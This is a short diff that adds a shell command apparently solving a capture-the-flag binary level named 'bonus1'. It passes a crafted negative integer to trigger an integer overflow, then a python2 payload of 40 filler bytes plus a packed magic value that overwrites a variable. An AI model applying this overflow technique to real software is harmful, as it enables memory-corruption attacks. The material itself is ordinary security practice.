@@ -1,0 +1,6 @@
+/home/user/bonus1/bonus1 -1073741813 "$(python2 - <<'PY'
+	import struct
+	payload = "A"*40 + struct.pack("<I", 0x574f4c46)
+	print payload
+	PY
+	)"
